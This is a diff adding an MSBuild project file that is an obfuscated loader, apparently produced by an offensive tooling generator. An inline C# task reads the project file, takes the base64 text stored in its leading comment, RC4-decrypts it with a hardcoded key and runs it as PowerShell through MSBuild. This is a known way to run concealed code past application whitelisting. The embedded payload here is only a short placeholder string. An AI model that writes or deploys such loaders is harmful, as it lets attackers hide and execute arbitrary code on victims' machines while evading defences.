@@ -1,0 +1,119 @@
+<!--
+CAFbaNAj0KhQubox
+-->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="izdFhv">
+   <izdFhv />
+   <fcpYdVLlBEyuXyyHyYqtZa />
+   </Target>
+  <UsingTask
+    TaskName="izdFhv"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+      <Using Namespace="System" />
+	  <Using Namespace="System.IO" />
+      <Code Type="Fragment" Language="cs">
+      </Code>
+    </Task>
+	</UsingTask>
+	<UsingTask
+    TaskName="fcpYdVLlBEyuXyyHyYqtZa"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+		using System;
+		using System.IO;
+		using System.Text;
+		using System.Management.Automation;
+		using System.Collections.Generic;
+		using System.Collections.ObjectModel;
+		using Microsoft.Build.Utilities;
+		using Microsoft.Build.Framework;
+		using System.Management.Automation.Runspaces;
+		
+		public class fcpYdVLlBEyuXyyHyYqtZa :  Task, ITask {	
+			public override bool Execute() {
+				string[] HbHUleGGCZpI = Environment.GetCommandLineArgs();
+			
+				Runspace jdNVsxz = RunspaceFactory.CreateRunspace();
+				jdNVsxz.Open();
+				RunspaceInvoke NWaWOJZTqPvgaWsEKTmfKCx = new RunspaceInvoke(jdNVsxz);
+				Pipeline PRBjdkOUcn = jdNVsxz.CreatePipeline();
+				
+				StreamReader ounbchGKCstD = File.OpenText(HbHUleGGCZpI[1]);
+				StringBuilder LTRaKWsxdsfAKMsXpmL = new StringBuilder();
+				string bfMPmOoMUQlclLeWUeFUa;
+				while((bfMPmOoMUQlclLeWUeFUa = ounbchGKCstD.ReadLine()) != null) {
+						if(String.Equals(bfMPmOoMUQlclLeWUeFUa, "-->")) {
+							byte[] IwmqT = {0x33, 0x99, 0x05, 0x74, 0x7e, 0x57, 0x3f, 0x91, 0xfb, 0x9b, 0x8b, 0x5e, 0xde, 0x80, 0x29, 0xe2, 0x16, 0xf3, 0xdb, 0xcb, 0xb3, 0xe3, 0x21, 0xf4, 0xcf, 0xe6, 0xa7, 0x21, 0x31, 0xef, 0xd7, 0xec};
+							byte[] RQonQ = Convert.FromBase64String(LTRaKWsxdsfAKMsXpmL.ToString());
+							string HEuIjEAQUxnKhFU = Encoding.UTF8.GetString(RHKYSzgcpLZYXMotNg.hnYPLleVlHeljlvxDhejzJN(IwmqT, RQonQ));
+						
+							PRBjdkOUcn.Commands.AddScript(HEuIjEAQUxnKhFU);
+							PRBjdkOUcn.Commands.Add("Out-String");
+							Collection<PSObject> wNEhAXw = PRBjdkOUcn.Invoke();
+							jdNVsxz.Close();
+							
+							StringBuilder dafimCcnFbmGFGFJGX = new StringBuilder();
+							foreach(PSObject WzOZQAjqBtcFadoKExvbecaw in wNEhAXw) {
+								dafimCcnFbmGFGFJGX.AppendLine(WzOZQAjqBtcFadoKExvbecaw.ToString());
+							}
+							Console.Write(dafimCcnFbmGFGFJGX.ToString());
+							return true;
+						}
+						if(!String.Equals(bfMPmOoMUQlclLeWUeFUa, "<!--")) {
+							LTRaKWsxdsfAKMsXpmL.AppendLine(bfMPmOoMUQlclLeWUeFUa);
+						}
+				}
+				return true;
+			}
+		}
+		
+		public class RHKYSzgcpLZYXMotNg {
+			public static byte[] VDZdtqAEv(byte[] QbUEIfajqOcBQD, byte[] AaWBcTDFxLejBCTQ) {
+				int BLNrWhhOEIKxSAU, CeaNvMD, erRoLVcxGwdnfIcHoOPPPE, YdYSjnehmGrvxbgofI, wfXivxvXInznu;
+				int[] cwXLTruasSKacXpAjb, ketOesuGzJEq;
+				byte[] OAtzYJDwPTwjTDocTtzKATws;
+
+				cwXLTruasSKacXpAjb = new int[256];
+				ketOesuGzJEq = new int[256];
+				OAtzYJDwPTwjTDocTtzKATws = new byte[AaWBcTDFxLejBCTQ.Length];
+
+				for (CeaNvMD = 0; CeaNvMD < 256; CeaNvMD++) {
+					cwXLTruasSKacXpAjb[CeaNvMD] = QbUEIfajqOcBQD[CeaNvMD % QbUEIfajqOcBQD.Length];
+					ketOesuGzJEq[CeaNvMD] = CeaNvMD;
+				}
+				for (erRoLVcxGwdnfIcHoOPPPE = CeaNvMD = 0; CeaNvMD < 256; CeaNvMD++) {
+					erRoLVcxGwdnfIcHoOPPPE = (erRoLVcxGwdnfIcHoOPPPE + ketOesuGzJEq[CeaNvMD] + cwXLTruasSKacXpAjb[CeaNvMD]) % 256;
+					wfXivxvXInznu = ketOesuGzJEq[CeaNvMD];
+					ketOesuGzJEq[CeaNvMD] = ketOesuGzJEq[erRoLVcxGwdnfIcHoOPPPE];
+					ketOesuGzJEq[erRoLVcxGwdnfIcHoOPPPE] = wfXivxvXInznu;
+				}
+				for (BLNrWhhOEIKxSAU = erRoLVcxGwdnfIcHoOPPPE = CeaNvMD = 0; CeaNvMD < AaWBcTDFxLejBCTQ.Length; CeaNvMD++) {
+					BLNrWhhOEIKxSAU++;
+					BLNrWhhOEIKxSAU %= 256;
+					erRoLVcxGwdnfIcHoOPPPE += ketOesuGzJEq[BLNrWhhOEIKxSAU];
+					erRoLVcxGwdnfIcHoOPPPE %= 256;
+					wfXivxvXInznu = ketOesuGzJEq[BLNrWhhOEIKxSAU];
+					ketOesuGzJEq[BLNrWhhOEIKxSAU] = ketOesuGzJEq[erRoLVcxGwdnfIcHoOPPPE];
+					ketOesuGzJEq[erRoLVcxGwdnfIcHoOPPPE] = wfXivxvXInznu;
+					YdYSjnehmGrvxbgofI = ketOesuGzJEq[((ketOesuGzJEq[BLNrWhhOEIKxSAU] + ketOesuGzJEq[erRoLVcxGwdnfIcHoOPPPE]) % 256)];
+					OAtzYJDwPTwjTDocTtzKATws[CeaNvMD] = (byte)(AaWBcTDFxLejBCTQ[CeaNvMD] ^ YdYSjnehmGrvxbgofI);
+				}
+				return OAtzYJDwPTwjTDocTtzKATws;
+			}
+
+			public static byte[] hnYPLleVlHeljlvxDhejzJN(byte[] JlbcbMsRDU, byte[] bALjHFggPHADH) {
+				return VDZdtqAEv(JlbcbMsRDU, bALjHFggPHADH);
+			}
+		}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
